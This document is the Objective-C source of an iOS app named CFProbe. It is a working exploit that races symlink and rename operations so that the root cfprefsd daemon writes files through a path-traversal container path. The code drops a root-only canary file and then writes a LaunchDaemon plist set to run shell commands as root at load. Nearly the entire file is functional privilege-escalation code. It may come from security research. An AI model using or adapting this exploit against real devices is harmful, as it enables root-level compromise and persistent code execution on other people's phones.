// CFProbe — cfprefsd AnyUser container race: root zero-file + LaunchDaemon plist write test.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <stdatomic.h>
#import <sys/stat.h>
#import <unistd.h>

typedef void (*SetValueC)(CFStringRef,CFTypeRef,CFStringRef,CFStringRef,CFStringRef,CFStringRef);
typedef Boolean (*SyncC)(CFStringRef,CFStringRef,CFStringRef,CFStringRef);
static SetValueC SetV; static SyncC SyncV;
static NSMutableString *L; static NSString *LP;
static void lg(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);NSLog(@"[cfprobe] %@",s);[L appendFormat:@"%@\n",s];[L writeToFile:LP atomically:YES encoding:NSUTF8StringEncoding error:nil];int fd=open(LP.fileSystemRepresentation,O_RDONLY);if(fd>=0){fsync(fd);close(fd);}}
static void rmnode(NSString*p){struct stat st;if(lstat(p.fileSystemRepresentation,&st)==0&&(S_ISLNK(st.st_mode)||S_ISREG(st.st_mode)))unlink(p.fileSystemRepresentation);}

// Run the race for one target/domain. values: optional dict of key->CFTypeRef (retained by caller).
static BOOL race_write(NSString *target, NSString *domain, NSDictionary *values, NSString *label) {
    NSString *nonce=NSUUID.UUID.UUIDString;
    NSString *tmp=NSTemporaryDirectory();
    NSString *appUUID=NSHomeDirectory().lastPathComponent;
    NSString *leaf=[NSString stringWithFormat:@"CFPrefs-%@-%@",label,nonce];
    NSString *actual=[tmp stringByAppendingPathComponent:leaf];
    NSString *hidden=[actual stringByAppendingString:@".hidden"];
    NSString *relative=[@"Library/Preferences" stringByAppendingPathComponent:[domain stringByAppendingPathExtension:@"plist"]];
    NSString *hiddenPref=[hidden stringByAppendingPathComponent:relative];
    NSString *raw=[NSString stringWithFormat:@"/private/var/containers/Shared/SystemGroup/../../../mobile/Containers/Data/Application/%@/tmp/%@",appUUID,leaf];
    NSFileManager *fm=NSFileManager.defaultManager; NSError *e=nil;
    BOOL ok=[fm createDirectoryAtPath:hidden withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions:@0700} error:&e] &&
            [fm createDirectoryAtPath:[hidden stringByAppendingPathComponent:@"Library/Preferences"] withIntermediateDirectories:YES attributes:nil error:&e] &&
            symlink(target.fileSystemRepresentation,hiddenPref.fileSystemRepresentation)==0;
    // prove the app itself cannot create the target
    errno=0; int fd=open(target.fileSystemRepresentation,O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC,0600);
    int de=errno; if(fd>=0){close(fd);unlink(target.fileSystemRepresentation);}
    lg(@"[%@] setup=%d directDenied=%d (errno=%d) target=%@ domain=%@",label,ok,(fd<0&&(de==EACCES||de==EPERM)),de,target,domain);
    if(!ok) return NO;
    __block _Atomic(bool) running=false; dispatch_semaphore_t first=dispatch_semaphore_create(0), stopped=dispatch_semaphore_create(0);
    atomic_store(&running,true);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE,0),^{
        BOOL sig=NO;
        while(atomic_load(&running)){
            rename(hidden.fileSystemRepresentation,actual.fileSystemRepresentation);
            usleep(35);
            if(rename(actual.fileSystemRepresentation,hidden.fileSystemRepresentation)==0 && !sig){sig=YES;dispatch_semaphore_signal(first);}
            usleep(35);
        }
        dispatch_semaphore_signal(stopped);
    });
    BOOL sent=NO;
    if(dispatch_semaphore_wait(first,dispatch_time(DISPATCH_TIME_NOW,NSEC_PER_SEC))==0){
        sent=YES;
        if(values.count){
            for(NSString*k in values){ SetV((__bridge CFStringRef)k,(__bridge CFTypeRef)values[k],(__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw); }
            SyncV((__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw);
            usleep(200000);
            // second pass: the first may have created an empty file; write again
            for(NSString*k in values){ SetV((__bridge CFStringRef)k,(__bridge CFTypeRef)values[k],(__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw); }
            SyncV((__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw);
            usleep(300000);
        } else {
            SetV(CFSTR("marker"),CFSTR("x"),(__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw);
            SyncV((__bridge CFStringRef)domain,kCFPreferencesAnyUser,kCFPreferencesAnyHost,(__bridge CFStringRef)raw);
            usleep(250000);
        }
    }
    atomic_store(&running,false); dispatch_semaphore_wait(stopped,dispatch_time(DISPATCH_TIME_NOW,2*NSEC_PER_SEC));
    if(lstat(actual.fileSystemRepresentation,&(struct stat){0})!=0){ rename(hidden.fileSystemRepresentation,actual.fileSystemRepresentation); }
    struct stat st={0}; BOOL hit= sent && lstat(target.fileSystemRepresentation,&st)==0;
    lg(@"[%@] sent=%d targetExists=%d uid=%d mode=%o size=%lld",label,sent,hit,hit?st.st_uid:-1,hit?st.st_mode&07777:0,hit?(long long)st.st_size:-1);
    NSString *actualPref=[actual stringByAppendingPathComponent:relative];
    NSData *ad=[NSData dataWithContentsOfFile:actualPref];
    lg(@"[%@] canonicalPref=%@ size=%lu",label,actualPref,(unsigned long)ad.length);
    if(ad.length) lg(@"[%@] canonicalHead=%@",label,[[NSString alloc] initWithData:[ad subdataWithRange:NSMakeRange(0,MIN(ad.length,400))] encoding:NSUTF8StringEncoding] ?: @"(binary)");
    if(hit && S_ISREG(st.st_mode)){
        NSData *d=[NSData dataWithContentsOfFile:target]; lg(@"[%@] head=%lu bytes",label,(unsigned long)d.length);
        if(d.length) lg(@"[%@] content=%@",label,[[NSString alloc] initWithData:[d subdataWithRange:NSMakeRange(0,MIN(d.length,800))] encoding:NSUTF8StringEncoding] ?: @"(binary)");
    }
    if(!values.count){ rmnode(target); }
    [fm removeItemAtPath:actual error:nil]; [fm removeItemAtPath:hidden error:nil];
    return hit;
}

static void run(void){
    void *cf=dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation",RTLD_NOW);
    SetV=(SetValueC)dlsym(cf,"_CFPreferencesSetValueWithContainer");
    SyncV=(SyncC)dlsym(cf,"_CFPreferencesSynchronizeWithContainer");
    lg(@"setValue=%p sync=%p",SetV,SyncV); if(!SetV||!SyncV)return;
    // 1) root-only canary in /private/var/db
    race_write(@"/private/var/db/smith_cfprefs_canary",@"com.smith.canary",nil,@"canary");
    // 2) LaunchDaemon plist: top-level keys via the preference domain dictionary
    NSDictionary *job=@{
        @"Label":@"com.smith.root",
        @"ProgramArguments":@[@"/bin/sh",@"-c",@"id > /var/mobile/rootproof_launchd; /usr/bin/touch /var/mobile/root_ok_launchd"],
        @"RunAtLoad":@YES
    };
    race_write(@"/Library/LaunchDaemons/com.smith.root.plist",@"com.smith.root",job,@"launchd");
    lg(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(nonatomic,strong)UIWindow*window;@property(nonatomic,strong)UITextView*tv;@end
@implementation AppDelegate
-(BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)o{
    NSString*docs=[NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];[[NSFileManager defaultManager]createDirectoryAtPath:docs withIntermediateDirectories:YES attributes:nil error:nil];
    LP=[docs stringByAppendingPathComponent:@"cfprobe.log"];L=[NSMutableString stringWithString:@"\n=== CFProbe ===\n"];
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];self.tv=[[UITextView alloc]initWithFrame:vc.view.bounds];self.tv.editable=NO;self.tv.font=[UIFont fontWithName:@"Menlo" size:9];[vc.view addSubview:self.tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)(1.0*NSEC_PER_SEC)),dispatch_get_main_queue(),^{dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{self.tv.text=L;});});});
    return YES;}
@end
int main(int c,char**v){@autoreleasepool{return UIApplicationMain(c,v,nil,NSStringFromClass([AppDelegate class]));}}
